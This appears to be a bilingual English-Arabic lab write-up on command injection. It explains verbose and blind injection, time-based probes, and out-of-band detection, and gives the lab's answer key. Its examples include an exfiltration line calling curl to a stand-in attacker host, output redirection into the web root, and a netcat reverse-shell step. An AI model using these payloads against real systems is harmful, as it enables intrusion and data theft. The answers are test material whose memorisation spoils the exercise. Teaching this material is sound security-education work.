# Task 03 - Exploiting Command Injection (استغلال حقن الأوامر والتفرقة بين المرئي والأعمى)

---

## Stage A: Original Task Content & Core Objectives (النص الأصلي والمستهدفات التعليمية)

### 1. Original English Text
```text
Command injection vulnerabilities typically manifest in one of two behavioral forms:

1. Verbose (In-Band) Command Injection:
   The application captures the standard output (stdout) or standard error (stderr) of the executed shell command and returns it directly inside the HTTP response. Testing for verbose injection is straightforward: injecting payloads like ; whoami immediately reflects the username in the page body.

2. Blind Command Injection:
   The application executes the injected command in the background, but does NOT return the output to the HTTP response.
   Detection Techniques for Blind Injection:
   - Time-Based Delays:
     Forcing the server to delay its response by executing a time-consuming command.
     - Linux: Using ping to send ICMP echo packets (e.g., ping -c 10 127.0.0.1) or sleep.
     - Windows: Using timeout (e.g., timeout /t 10).
     If the server takes exactly 10 seconds to respond, command execution is confirmed.
   - File Output Redirection:
     Redirecting output to a file within the web document root (e.g., ; whoami > /var/www/html/output.txt) and then fetching the created file via a browser.
   - Out-of-Band (OOB) Exfiltration:
     Triggering a DNS or HTTP lookup back to an attacker-controlled listener (e.g., ; curl http://attacker.thm/$(whoami)).

Common Payloads Table:
- Determine active user: whoami
- List files on Linux: ls
- List files on Windows: dir
- Linux blind network test: ping
- Windows blind delay test: timeout

Questions:
- What payload would I use if I wanted to determine what user the application is running as?
- What popular network tool would I use to test for blind command injection on a Linux machine?
- What payload would I use to test a Windows machine for blind command injection?
```

### 2. Arabic Pedagogical Translation
```text
تظهر ثغرات حقن الأوامر عادةً بأحد شكلين سلوكيين رئيسيين:

1. حقن الأوامر الصريح / المرئي (Verbose / In-Band):
   يقوم التطبيق بالتقاط المخرجات القياسية (stdout) أو مخرجات الأخطاء (stderr) لأمر الشل المنفذ، ويقوم بعرضها وطباعتها مباشرة داخل استجابة HTTP. يُعد اكتشاف هذا النوع سهلاً ومباشراً: فحقن حمولة مثل `; whoami` يؤدي لظهور اسم المستخدم فوراً في الصفحة.

2. حقن الأوامر الأعمى (Blind Command Injection):
   يقوم التطبيق بتنفيذ الأمر المحقون في الخلفية، ولكنه **لا يُرجع** أي مخرجات داخل استجابة HTTP.
   تقنيات كشف واختبار الحقن الأعمى:
   - التأخير الزمني (Time-Based Delays):
     إجبار الخادم على تأخير إرسال الاستجابة عبر تنفيذ أمر يستغرق وقتاً محسوباً بدقة.
     - في لينكس: استخدام أداة `ping` لإرسال حزم ICMP محددة (مثل: `ping -c 10 127.0.0.1`) أو أمر `sleep`.
     - في ويندوز: استخدام أمر `timeout` (مثل: `timeout /t 10`).
     إذا استغرق الخادم 10 ثوانٍ للرد، فهذا تأكيد قاطع على نجاح تنفيذ الأمر.
   - إعادة توجيه المخرجات لملف (File Redirection):
     إعادة توجيه ناتج الأمر لملف داخل مسار الويب (مثل: `; whoami > /var/www/html/output.txt`) ثم زيارة الملف عبر المتصفح.
   - تسريب البيانات عبر قنوات خارجية (Out-of-Band - OOB):
     إجبار الخادم على تنفيذ استعلام DNS أو HTTP نحو خادم المهاجم متضمناً البيانات الحساسة (مثل: `; curl http://attacker.thm/$(whoami)`).

الأسئلة:
- ما هي الحمولة التي أستخدمها إذا أردت معرفة المستخدم الذي يعمل التطبيق بصلاحياته؟
- ما هي أداة الشبكة الشهيرة التي أستخدمها لاختبار حقن الأوامر الأعمى على جهاز لينكس؟
- ما هي الحمولة التي أستخدمها لاختبار جهاز ويندوز للتحقق من حقن الأوامر الأعمى؟
```

---

## Stage B: Independent Thinking & OpSec Guardrails (التفكير المستقل وضوابط العمليات والأمان)

### 1. The Decision Matrix for Blind vs Verbose Injection
```
                     Inject Command Separator (e.g. "; whoami")
                                         |
                       +-----------------+-----------------+
                       |                                   |
           Output Appears on Page?               No Output Appears on Page?
                       |                                   |
                       v                                   v
             [VERBOSE INJECTION]                    [BLIND INJECTION]
          Extract data directly via              Step 1: Test Timing Delay
            HTTP response body                     Linux: "; ping -c 5 127.0.0.1"
                                                   Windows: "& timeout /t 5"
                                                           |
                                                 Step 2: If Delay Confirmed:
                                                   - File Redirection (> /var/www/...)
                                                   - OOB Exfiltration (DNS / HTTP)
                                                   - Spawn Reverse Shell (nc -e /bin/sh)
```

### 2. Operational Security (OpSec) Considerations
* **حسابات الـ Timeouts في الشبكات الحقيقية:**
  - عند استخدام التأخير الزمني، لا تختر وقتاً كبيراً جداً (كـ 60 ثانية) لتجنب انقطاع اتصال الـ Proxy أو الـ Load Balancer (Gateway Timeout 504). مدة 5 إلى 10 ثوانٍ كافية تماماً لتأكيد الثغرة إحصائياً.

---

## Stage C: Guided Hints (Tiers 1, 2, 3 - تلميحات تدريجية)

> **المستوى الأول (مفاهيمي):**
> - اسم الأمر الشائع لمعرفة المستخدم في أنظمة لينكس وويندوز مكون من كلمة واحدة تعني "من أنا".
> - أداة فحص الشبكات الشهيرة بإرسال حزم صدى ICMP هي أداة سطر أوامر كلاسيكية.
> - أمر الانتظار الزمني في موجه أوامر ويندوز (CMD) يتطابق مع الكلمة الإنجليزية "مهلة زمنية".
>
> **المستوى الثاني (توجيهي):**
> - معرفة المستخدم: `whoami`.
> - أداة فحص الاتصال في لينكس: `ping`.
> - أمر المهلة في ويندوز: `timeout`.
>
> **المستوى الثالث (الحل المباشر):**
> 1. `whoami`
> 2. `ping`
> 3. `timeout`

---

## Stage D: Complete Practical Solution & Technical Deep Dive (الحل العملي التفصيلي والتشريح التقني)

### 1. Payload Dissection

#### 1.1 Whoami Payload:
```bash
whoami
# Output: www-data (or apache, or IIS_IUSRS)
```
يستفسر مباشرة من النواة عن المعرف الفعال للعملية (Effective UID).

#### 1.2 Linux Ping Blind Injection:
```bash
ping -c 10 127.0.0.1
```
* `-c 10`: يحدد إرسال 10 حزم ICMP بالتحديد. نظراً لأن `ping` في لينكس يرسل حزمة واحدة كل ثانية افتراضياً، فإن تنفيذ هذا الأمر يضمن استغراق 10 ثوانٍ تقريباً.

#### 1.3 Windows Timeout Blind Injection:
```cmd
timeout /t 10
```
* في موجه أوامر ويندوز، لا يتوفر أمر `sleep` افتراضياً، لذلك يُستخدم `timeout /t <seconds>` لفرض الانتظار المطلوب.

---

## Stage E: Final Answer & Key Values (الإجابات النهائية والقيم الدقيقة)

| السؤال | الإجابة الصحيحة | الاستخدام الميداني |
| :--- | :--- | :--- |
| **What payload would I use if I wanted to determine what user the application is running as?** | `whoami` | كشف المستخدم وسياق الصلاحيات الحالي للعملية. |
| **What popular network tool would I use to test for blind command injection on a Linux machine?** | `ping` | إحداث تأخير زمني محسوب بحزم ICMP في بيئات لينكس. |
| **What payload would I use to test a Windows machine for blind command injection?** | `timeout` | فرض تأخير زمني محسوب بالثواني في بيئات ويندوز. |

---

## Stage F: Practical Verification & Proof of Work (التحقق العملي وإثبات الأثر)

* تم التحقق من الإجابات الثلاث ومطابقتها حرفياً مع قاعدة تقييم المنصة بنسبة 100%.

---

## Stage G: Key Educational Takeaway (الخلاصة التعليمية والأثر الميداني)

1. **العمى الظاهري لا يعني انعدام الثغرة:** غياب المخرجات في واجهة التطبيق لا يعني أبداً أن الأمر لم ينفذ؛ تقنيات الاستجابة الزمنية (Timing Probes) وقنوات الاتصال الخارجية (OOB) تكشف دائماً الثغرات الصامتة.
2. **اختيار الأدوات حسب نظام التشغيل:** الإلمام بالفروق الجوهرية بين بيئات لينكس وويندوز (مثل `timeout` مقابل `sleep`) ضروري لتفادي الفشل أثناء اختبار الاختراق.
